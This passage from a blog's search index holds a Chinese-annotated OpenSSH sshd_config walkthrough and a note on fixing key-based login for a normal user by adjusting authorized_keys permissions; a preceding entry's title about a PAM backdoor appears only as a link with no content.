PAM后门：窃取ssh密码及自定义密码登录</a></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssh服务端配置文件整理</title>
      <link href="posts/3881.html"/>
      <url>posts/3881.html</url>
      
        <content type="html"><![CDATA[<h3 id="1-ssh远程登录配置文件说明"><a href="#1-ssh远程登录配置文件说明" class="headerlink" title="1. ssh远程登录配置文件说明"></a>1. ssh远程登录配置文件说明</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#$OpenBSD: sshd_config,v 1.103 2018/04/09 20:41:22 tj Exp $</span><span class="token comment"># This is the sshd server system-wide configuration file.  See</span><span class="token comment"># sshd_config(5) for more information.</span><span class="token comment"># This sshd was compiled with PATH=/usr/bin:/bin:/usr/sbin:/sbin</span><span class="token comment"># The strategy used for options in the default sshd_config shipped with</span><span class="token comment"># OpenSSH is to specify options with their default value where</span><span class="token comment"># possible, but leave them commented.  Uncommented options override the</span><span class="token comment"># default value.</span><span class="token comment">#监听的端口</span><span class="token comment">#Port 22</span><span class="token comment">#家族地址，any表示同时监听ipv4和ipv6</span><span class="token comment">#AddressFamily any</span><span class="token comment">#监听本机所有IPv4地址</span><span class="token comment">#ListenAddress 0.0.0.0</span><span class="token comment">#监听本机所有IPv6地址</span><span class="token comment">#ListenAddress ::</span><span class="token comment">#ssh所使用的RSA私钥路径</span><span class="token comment">#HostKey /etc/ssh/ssh_host_rsa_key</span><span class="token comment">#HostKey /etc/ssh/ssh_host_ecdsa_key</span><span class="token comment">#HostKey /etc/ssh/ssh_host_ed25519_key</span><span class="token comment"># Ciphers and keying</span><span class="token comment">#RekeyLimit default none</span><span class="token comment"># Logging</span><span class="token comment">#设定在记录来自sshd的消息的时候，是否给出“facility code</span><span class="token comment">#SyslogFacility AUTH</span><span class="token comment">#日志记录级别，默认为info</span><span class="token comment">#LogLevel INFO</span><span class="token comment"># Authentication:</span><span class="token comment">#限定用户认证时间为2min</span><span class="token comment">#LoginGraceTime 2m</span><span class="token comment">#是否允许root账户ssh登录,生成环境使用root账号登录危害极大,自己玩玩就无所谓了</span><span class="token comment">#PermitRootLogin prohibit-password</span>PermitRootLogin <span class="token function">yes</span><span class="token comment">#设置ssh在接收登录请求之前是否检查用户根目录和rhosts文件的权限和所有权，建议开启</span><span class="token comment">#StrictModes yes</span><span class="token comment">#指定每个连接最大允许的认证次数。默认值是</span><span class="token comment">#MaxAuthTries 6</span><span class="token comment">#最大允许保持多少个连接。默认值是 10</span><span class="token comment">#MaxSessions 10</span><span class="token comment">#是否开启公钥验证</span><span class="token comment">#PubkeyAuthentication yes</span>PubkeyAuthentication <span class="token function">yes</span><span class="token comment"># Expect .ssh/authorized_keys2 to be disregarded by default in future.</span><span class="token comment">#公钥验证文件路径</span><span class="token comment">#AuthorizedKeysFile.ssh/authorized_keys .ssh/authorized_keys2</span>AuthorizedKeysFile.ssh/authorized_keys %h/.ssh/authorized_keys2<span class="token comment">#AuthorizedPrincipalsFile none</span><span class="token comment">#AuthorizedKeysCommand none</span><span class="token comment">#AuthorizedKeysCommandUser nobody</span><span class="token comment"># For this to work you will also need host keys in /etc/ssh/ssh_known_hosts</span><span class="token comment">#HostbasedAuthentication no</span><span class="token comment"># Change to yes if you don't trust ~/.ssh/known_hosts for</span><span class="token comment"># HostbasedAuthentication</span><span class="token comment">#IgnoreUserKnownHosts no</span><span class="token comment"># Don't read the user's ~/.rhosts and ~/.shosts files</span><span class="token comment">#IgnoreRhosts yes</span><span class="token comment"># To disable tunneled clear text passwords, change to no here!</span><span class="token comment">#是否允许密码验证</span><span class="token comment">#PasswordAuthentication yes</span>PasswordAuthentication <span class="token function">yes</span><span class="token comment">#是否允许空密码登录</span><span class="token comment">#PermitEmptyPasswords no</span><span class="token comment"># Change to yes to enable challenge-response passwords (beware issues with</span><span class="token comment"># some PAM modules and threads)</span><span class="token comment">#是否允许质疑-应答(challenge-response)认证</span>ChallengeResponseAuthentication no<span class="token comment"># Kerberos options</span><span class="token comment">#KerberosAuthentication no</span><span class="token comment">#KerberosOrLocalPasswd yes</span><span class="token comment">#KerberosTicketCleanup yes</span><span class="token comment">#KerberosGetAFSToken no</span><span class="token comment"># GSSAPI options</span><span class="token comment">#是否允许基于GSSAPI的用户认证</span><span class="token comment">#GSSAPIAuthentication no</span><span class="token comment">#是否在用户退出登录后自动销毁用户凭证缓存</span><span class="token comment">#GSSAPICleanupCredentials yes</span><span class="token comment">#GSSAPIStrictAcceptorCheck yes</span><span class="token comment">#GSSAPIKeyExchange no</span><span class="token comment"># Set this to 'yes' to enable PAM authentication, account processing,</span><span class="token comment"># and session processing. If this is enabled, PAM authentication will</span><span class="token comment"># be allowed through the ChallengeResponseAuthentication and</span><span class="token comment"># PasswordAuthentication.  Depending on your PAM configuration,</span><span class="token comment"># PAM authentication via ChallengeResponseAuthentication may bypass</span><span class="token comment"># the setting of "PermitRootLogin without-password".</span><span class="token comment"># If you just want the PAM account and session checks to run without</span><span class="token comment"># PAM authentication, then enable this but set PasswordAuthentication</span><span class="token comment"># and ChallengeResponseAuthentication to 'no'.</span><span class="token comment">#是否通过PAM验证</span>UsePAM <span class="token function">yes</span><span class="token comment">#AllowAgentForwarding yes</span><span class="token comment">#AllowTcpForwarding yes</span><span class="token comment">#是否允许远程主机连接本地的转发端口</span><span class="token comment">#GatewayPorts no</span><span class="token comment">#是否允许X11转发</span>X11Forwarding <span class="token function">yes</span><span class="token comment">#X11DisplayOffset 10</span><span class="token comment">#X11UseLocalhost yes</span><span class="token comment">#PermitTTY yes</span><span class="token comment">#是否在每一次交互式登录时打印 /etc/motd 文件的内</span>PrintMotd <span class="token function">yes</span><span class="token comment">#PrintLastLog yes</span>PrintLastLog <span class="token function">yes</span><span class="token comment">#TCPKeepAlive yes</span><span class="token comment">#PermitUserEnvironment no</span><span class="token comment">#Compression delayed</span><span class="token comment">#ClientAliveInterval 0</span><span class="token comment">#ClientAliveCountMax 3</span><span class="token comment">#UseDNS no</span><span class="token comment">#PidFile /var/run/sshd.pid</span><span class="token comment">#MaxStartups 10:30:100</span><span class="token comment">#PermitTunnel no</span><span class="token comment">#ChrootDirectory none</span><span class="token comment">#VersionAddendum none</span><span class="token comment"># no default banner path</span><span class="token comment">#Banner none</span><span class="token comment"># Allow client to pass locale environment variables</span>AcceptEnv <span class="token environment constant">LANG</span> LC_*<span class="token comment"># override default of no subsystems</span>Subsystem<span class="token function">sftp</span>/usr/lib/openssh/sftp-server<span class="token comment"># Example of overriding settings on a per-user basis</span><span class="token comment">#Match User anoncvs</span><span class="token comment">#X11Forwarding no</span><span class="token comment">#AllowTcpForwarding no</span><span class="token comment">#PermitTTY no</span><span class="token comment">#ForceCommand cvs server</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-普通用户使用密钥登录时出现的问题"><a href="#2-普通用户使用密钥登录时出现的问题" class="headerlink" title="2. 普通用户使用密钥登录时出现的问题"></a>2. 普通用户使用密钥登录时出现的问题</h3><h4 id="1-普通用户家目录下-ssh-authorized-keys-权限配置不对"><a href="#1-普通用户家目录下-ssh-authorized-keys-权限配置不对" class="headerlink" title="1. 普通用户家目录下 ./ssh/authorized_keys 权限配置不对"></a>1. 普通用户家目录下 ./ssh/authorized_keys 权限配置不对</h4><p><img src="./medias/detail/load.gif" data-original="https://blog.ryzezr.com/usr/uploads/2021/05/580441958.png"></p><p>此时<code>drcom</code>用户的<code> authorized_keys</code>文件是 <code>600</code>权限，虽然已经正确配置了密钥，但是登录时依然需要drcom用户提供密码</p><p>修改 <code>/home/drcom/.ssh/authorized_keys </code>的权限为 <code>644</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> <span class="token number">644</span> authorized_keys<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="./medias/detail/load.gif" data-original="https://blog.ryzezr.com/usr/uploads/2021/05/3676596635.png"></p><p>修改完权限后，drcom能通过密钥正常登录</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ol><li><a href="https://segmentfault.com/q/1010000000613569">普通用户 ssh 密钥登录失败的问题，困惑了很久</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssh配置文件 </tag>
            
            <tag> ssh远程登录时遇到的问题 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
